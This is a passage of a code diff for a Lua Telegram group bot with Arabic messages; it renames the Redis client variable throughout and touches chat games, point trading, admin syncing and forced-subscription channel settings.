+DevABS:set(BRAND..'BRAND:GameNum6'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'9','7 + 2 = ?')
 name = string.gsub(name,'46','41 + 5 = ?')
 name = string.gsub(name,'2','5 - 3 = ?')
@@ -3797,21 +3797,21 @@ BRANDTTEAM = '⌁︙اكمل المعادله التاليه ↫ ⤈\n{'..name..
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum6'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
-DevBRAND:del(BRAND..'BRAND:GameNum6'..msg.chat_id_)
+if text == DevABS:get(BRAND..'BRAND:GameNum6'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:del(BRAND..'BRAND:GameNum6'..msg.chat_id_)
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ رياضيات للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end  
 if text == 'الانكليزي' and SourceCh(msg) or text == 'الانجليزيه' and SourceCh(msg) or text == 'انكليزيه' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum7'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
+name = DevABS2[math.random(#DevABS2)]
+DevABS:set(BRAND..'BRAND:GameNum7'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'ذئب','Wolf')
 name = string.gsub(name,'معلومات','Information')
 name = string.gsub(name,'قنوات','Channels')
@@ -3828,22 +3828,22 @@ BRANDTTEAM = '⌁︙ما معنى كلمة ↫ '..name
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum7'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
-DevBRAND:del(BRAND..'BRAND:GameNum7'..msg.chat_id_)
+if text == DevABS:get(BRAND..'BRAND:GameNum7'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:del(BRAND..'BRAND:GameNum7'..msg.chat_id_)
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ انكليزيه للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end  
 --     Source BRAND     --
 if text == 'اسئله' and SourceCh(msg) or text == 'اختيارات' and SourceCh(msg) or text == 'الاسئله' and SourceCh(msg) or text == 'اساله' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
-name = DevBRAND2[math.random(#DevBRAND2)]
-DevBRAND:set(BRAND..'BRAND:GameNum8'..msg.chat_id_,name)
-DevBRAND:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
+name = DevABS2[math.random(#DevABS2)]
+DevABS:set(BRAND..'BRAND:GameNum8'..msg.chat_id_,name)
+DevABS:del(BRAND..'BRAND:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'النيل','⌁︙ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
 name = string.gsub(name,'14','⌁︙ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
 name = string.gsub(name,'الفم','⌁︙كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
@@ -3878,38 +3878,38 @@ BRANDTTEAM = name..'\n⌁︙ارسل الجواب الصحيح فقط'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 return false
 end end
-if text == DevBRAND:get(BRAND..'BRAND:GameNum8'..msg.chat_id_) then
-if not DevBRAND:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
-DevBRAND:del(BRAND..'BRAND:GameNum8'..msg.chat_id_)
+if text == DevABS:get(BRAND..'BRAND:GameNum8'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Games:Ids'..msg.chat_id_) then 
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+DevABS:del(BRAND..'BRAND:GameNum8'..msg.chat_id_)
 BRANDTTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ الاسئله للعب مره اخرى'
 Dev_BRAND(msg.chat_id_, msg.id_, 1,BRANDTTEAM, 1, 'md')
 end
-DevBRAND:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Games:Ids'..msg.chat_id_,true)
 end  
 --     Source BRAND     --
-if DevBRAND:get(BRAND.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
+if DevABS:get(BRAND.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
 if tonumber(NUM) > 20 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,"⌁︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
 return false  end 
-local GETNUM = DevBRAND:get(BRAND.."GAMES:NUM"..msg.chat_id_)
+local GETNUM = DevABS:get(BRAND.."GAMES:NUM"..msg.chat_id_)
 if tonumber(NUM) == tonumber(GETNUM) then
-DevBRAND:del(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
-DevBRAND:del(BRAND.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
-DevBRAND:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
+DevABS:del(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
+DevABS:del(BRAND.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
+DevABS:incrby(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
 elseif tonumber(NUM) ~= tonumber(GETNUM) then
-DevBRAND:incrby(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
-if tonumber(DevBRAND:get(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
-DevBRAND:del(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
-DevBRAND:del(BRAND.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
+DevABS:incrby(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
+if tonumber(DevABS:get(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
+DevABS:del(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
+DevABS:del(BRAND.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
 else
-if tonumber(DevBRAND:get(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
+if tonumber(DevABS:get(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
 SetNum = 'محاولتان فقط'
-elseif tonumber(DevBRAND:get(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
+elseif tonumber(DevABS:get(BRAND..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
 SetNum = 'محاوله واحده فقط'
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
@@ -3918,37 +3918,37 @@ end
 end
 end
 if text == 'خمن' and SourceCh(msg) or text == 'تخمين' and SourceCh(msg) then   
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
 Num = math.random(1,20)
-DevBRAND:set(BRAND.."GAMES:NUM"..msg.chat_id_,Num) 
+DevABS:set(BRAND.."GAMES:NUM"..msg.chat_id_,Num) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n⌁︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
-DevBRAND:setex(BRAND.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
+DevABS:setex(BRAND.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
 return false  
 end
 end
 --     Source BRAND     --
 if text == 'روليت' then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
-DevBRAND:del(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
-DevBRAND:del(BRAND..'BRAND:ListRolet'..msg.chat_id_)  
-DevBRAND:setex(BRAND.."BRAND:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+DevABS:del(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND..'BRAND:ListRolet'..msg.chat_id_)  
+DevABS:setex(BRAND.."BRAND:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
 return false  
 end
 end
-if text and text:match("^(%d+)$") and DevBRAND:get(BRAND.."BRAND:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
+if text and text:match("^(%d+)$") and DevABS:get(BRAND.."BRAND:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
 if text == "1" then
 Text = "⌁︙لا استطيع بدء اللعبه بلاعب واحد فقط"
 else
-DevBRAND:set(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
+DevABS:set(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
 Text = '⌁︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n⌁︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
 end
-DevBRAND:del(BRAND.."BRAND:StartRolet"..msg.chat_id_..msg.sender_user_id_)
+DevABS:del(BRAND.."BRAND:StartRolet"..msg.chat_id_..msg.sender_user_id_)
 send(msg.chat_id_,msg.id_,Text)
 return false
 end
-if text and text:match('^(@[%a%d_]+)$') and DevBRAND:get(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
-if DevBRAND:sismember(BRAND..'BRAND:ListRolet'..msg.chat_id_,text) then
+if text and text:match('^(@[%a%d_]+)$') and DevABS:get(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
+if DevABS:sismember(BRAND..'BRAND:ListRolet'..msg.chat_id_,text) then
 send(msg.chat_id_,msg.id_,'⌁︙المعرف ↫ ['..text..'] موجود اساسا')
 return false
 end
@@ -3957,13 +3957,13 @@ if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
 return false 
 end
-DevBRAND:sadd(BRAND..'BRAND:ListRolet'..msg.chat_id_,text)
-local CountAdd = DevBRAND:get(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_)
-local CountAll = DevBRAND:scard(BRAND..'BRAND:ListRolet'..msg.chat_id_)
+DevABS:sadd(BRAND..'BRAND:ListRolet'..msg.chat_id_,text)
+local CountAdd = DevABS:get(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_)
+local CountAll = DevABS:scard(BRAND..'BRAND:ListRolet'..msg.chat_id_)
 local CountUser = CountAdd - CountAll
 if tonumber(CountAll) == tonumber(CountAdd) then 
-DevBRAND:del(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
-DevBRAND:setex(BRAND.."BRAND:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
+DevABS:del(BRAND.."BRAND:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
+DevABS:setex(BRAND.."BRAND:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
 local Text = "⌁︙تم ادخال المعرف ↫ ["..text.."]\n⌁︙وتم اكتمال العدد الكلي هل انت مستعد ؟"
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
@@ -3979,7 +3979,7 @@ end,nil)
 end
 --     Source BRAND     --
 if text == 'كت تويت' and SourceCh(msg) or text == 'كت' and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
 local BRANDTTEAM = {
 'آخر مرة زرت مدينة الملاهي؟','آخر مرة أكلت أكلتك المفضّلة؟','الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل','آخر شيء ضاع منك؟','كلمة أخيرة لشاغل البال؟','طريقتك المعتادة في التخلّص من الطاقة السلبية؟','شهر من أشهر العام له ذكرى جميلة معك؟','كلمة غريبة من لهجتك ومعناها؟🤓','‏- شيء سمعته عالق في ذهنك هاليومين؟','متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟','‏- أبرز صفة حسنة في صديقك المقرب؟','هل تشعر أن هنالك مَن يُحبك؟','اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟','أجمل شيء حصل معك خلال هاليوم؟','صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔','كلمة لشخص غالي اشتقت إليه؟💕','آخر خبر سعيد، متى وصلك؟','أنا آسف على ....؟','أوصف نفسك بكلمة؟','صريح، مشتاق؟','‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟','‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭','‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤','‏- تخيّل شيء قد يحدث في المستقبل؟','‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚','شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟','| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.','كم مره تسبح باليوم','نسبة النعاس عندك حاليًا؟','لو فقط مسموح شخص واحد تتابعه فالسناب مين بيكون ؟','يهمك ملابسك تكون ماركة ؟','وش الشيء الي تطلع حرتك فيه و زعلت ؟','عندك أخوان او خوات من الرضاعة؟','عندك معجبين ولا محد درا عنك؟',
 'أطول مدة قضيتها بعيد عن أهلك ؟','لو يجي عيد ميلادك تتوقع يجيك هدية؟','يبان عليك الحزن من " صوتك - ملامحك','وين تشوف نفسك بعد سنتين؟','وش يقولون لك لما تغني ؟','عندك حس فكاهي ولا نفسية؟','كيف تتصرف مع الشخص الفضولي ؟','كيف هي أحوال قلبك؟','حاجة تشوف نفسك مبدع فيها ؟','متى حبيت؟','شيء كل م تذكرته تبتسم ...','العلاقه السريه دايماً تكون حلوه؟','صوت مغني م تحبه','لو يجي عيد ميلادك تتوقع يجيك هدية؟','اذا احد سألك عن شيء م تعرفه تقول م اعرف ولا تتفلسف ؟','مع او ضد : النوم افضل حل لـ مشاكل الحياة؟','مساحة فارغة (..............) اكتب اي شيء تبين','اغرب اسم مر عليك ؟','عمرك كلمت فويس احد غير جنسك؟','اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟','لو عندك فلوس وش السيارة اللي بتشتريها؟','وش اغبى شيء سويته ؟','شيء من صغرك ماتغير فيك؟','وش نوع الأفلام اللي تحب تتابعه؟','وش نوع الأفلام اللي تحب تتابعه؟','تجامل احد على حساب مصلحتك ؟','تتقبل النصيحة من اي شخص؟','كلمه ماسكه معك الفترة هذي ؟','متى لازم تقول لا ؟','اكثر شيء تحس انه مات ف مجتمعنا؟','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','هل تعتقد أن هنالك من يراقبك بشغف؟','اشياء اذا سويتها لشخص تدل على انك تحبه كثير ؟','اشياء صعب تتقبلها بسرعه ؟','اقتباس لطيف؟','أكثر جملة أثرت بك في حياتك؟','عندك فوبيا من شيء ؟.',
@@ -3992,7 +3992,7 @@ end
 end
 --     Source BRAND     --
 if text and (text == 'الالعاب' or text == 'العاب' or text == 'اللعبه') and SourceCh(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Games'..msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,[[
 ⌁︙قائمة العاب المجموعه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -4021,13 +4021,13 @@ end
 end
 --     Source BRAND     --
 if text == 'بيع نقاطي' and ChCheck(msg) then
-if tonumber((DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
+if tonumber((DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لم تربح اي نقطه\n⌁︙ارسل ↫ الالعاب للعب', 1, 'md')
 else
-DevBRAND0 = (DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
-DevBRAND:incrby(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevBRAND0)
-Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙تم بيع '..(DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⌁︙كل نقطه تساوي 50 رساله', 'md')
-DevBRAND:del(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
+DevABS0 = (DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
+DevABS:incrby(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevABS0)
+Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙تم بيع '..(DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⌁︙كل نقطه تساوي 50 رساله', 'md')
+DevABS:del(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
 end
 end
 --     Source BRAND     --
@@ -4037,20 +4037,20 @@ local num = 0
 local admins = abbas.members_  
 for i=0 , #admins do   
 if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)   
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)   
 num = num + 1
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
 if dp.first_name_ == false then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)   
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)   
 end
 end,nil)   
 else
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)   
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)   
 end 
 if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then  
 Manager_id = admins[i].user_id_  
-DevBRAND:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,Manager_id)  
-DevBRAND:sadd(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,Manager_id)   
+DevABS:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,Manager_id)  
+DevABS:sadd(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,Manager_id)   
 end  
 end  
 if num == 0 then
@@ -4062,13 +4062,13 @@ end,nil)
 end
 --     Source BRAND     --
 if text == 'غادر' and SudoBot(msg) then
-if DevBRAND:get(BRAND.."BRAND:Left:Bot"..BRAND) and not SecondSudo(msg) then
+if DevABS:get(BRAND.."BRAND:Left:Bot"..BRAND) and not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_,msg.id_, 1, "⌁︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
 return false  
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم مغادرة المجموعه \n⌁︙تم حذف جميع بياناتها ', 1, 'md')
 ChatLeave(msg.chat_id_, BRAND)
-DevBRAND:srem(BRAND.."BRAND:Groups",msg.chat_id_)
+DevABS:srem(BRAND.."BRAND:Groups",msg.chat_id_)
 end
 --     Source BRAND     --
 if text ==('موقعي') and ChCheck(msg) then
@@ -4086,10 +4086,10 @@ end
 --     Source BRAND     --
 if text == "معلوماتي" and ChCheck(msg) then
 function get_me(extra,result,success)
-local msguser = tonumber(DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
-local user_msgs = DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local cont = (tonumber(DevBRAND:get(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
-local user_nkt = tonumber(DevBRAND:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
+local msguser = tonumber(DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
+local user_msgs = DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local cont = (tonumber(DevABS:get(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
+local user_nkt = tonumber(DevABS:get(BRAND..'BRAND:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
 if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
 if result.last_name_ then lastname = result.last_name_ else lastname = '' end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n⌁︙معرفك ↫ ❨ ['..username..'] ❩\n⌁︙ايديك ↫ ❨ `'..result.id_..'` ❩\n⌁︙نقاطك ↫ ❨ '..user_nkt..' ❩\n⌁︙رسائلك ↫ ❨ '..user_msgs..' ❩\n⌁︙جهاتك ↫ ❨ '..cont..' ❩\n⌁︙تفاعلك ↫ '..formsgs(msguser)..'\n⌁︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
@@ -4102,7 +4102,7 @@ if text == "تعيين قناة الاشتراك" or text == "تغيير قنا�
 if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevBRAND:setex(BRAND..'DevBRAND4'..msg.sender_user_id_,360,true)
+DevABS:setex(BRAND..'DevABS4'..msg.sender_user_id_,360,true)
 send(msg.chat_id_, msg.id_, '⌁︙ارسل لي معرف قناة الاشتراك الان')
 end
 return false  
@@ -4111,12 +4111,12 @@ if text == "تفعيل الاشتراك الاجباري" then
 if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-if DevBRAND:get(BRAND..'BRAND:ChId') then
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevBRAND:get(BRAND.."BRAND:ChId"))
+if DevABS:get(BRAND..'BRAND:ChId') then
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevABS:get(BRAND.."BRAND:ChId"))
 local GetInfo = JSON.decode(Check)
 send(msg.chat_id_, msg.id_,"⌁︙الاشتراك الاجباري مفعل \n⌁︙على القناة ↫ [@"..GetInfo.result.username.."]")
 else
-DevBRAND:setex(BRAND..'DevBRAND4'..msg.sender_user_id_,360,true)
+DevABS:setex(BRAND..'DevABS4'..msg.sender_user_id_,360,true)
 send(msg.chat_id_, msg.id_,"⌁︙لاتوجد قناة لتفعيل الاشتراك\n⌁︙ارسل لي معرف قناة الاشتراك الان")
 end
 end
@@ -4126,7 +4126,7 @@ if text == "تعطيل الاشتراك الاجباري" then
 if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevBRAND:del(BRAND..'BRAND:ChId')
+DevABS:del(BRAND..'BRAND:ChId')
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الاشتراك الاجباري'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
@@ -4136,14 +4136,14 @@ if text == "حذف قناة الاشتراك" or text == "حذف قناه الا
 if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevBRAND:del(BRAND..'BRAND:ChId')
+DevABS:del(BRAND..'BRAND:ChId')
 Dev_BRAND(msg.chat_id_, msg.id_, 1,"⌁︙تم حذف قناة الاشتراك الاجباري", 1, 'md') 
 end
 end
 if SecondSudo(msg) then
 if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
-if DevBRAND:get(BRAND..'BRAND:ChId') then
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevBRAND:get(BRAND.."BRAND:ChId"))
+if DevABS:get(BRAND..'BRAND:ChId') then
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevABS:get(BRAND.."BRAND:ChId"))
 local GetInfo = JSON.decode(Check)
 send(msg.chat_id_, msg.id_, "⌁︙قناة الاشتراك ↫ [@"..GetInfo.result.username.."]")
 else
@@ -4155,15 +4155,15 @@ end end
 if SudoBot(msg) then
 if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
 function BRANDTTEAM(extra,result,success)
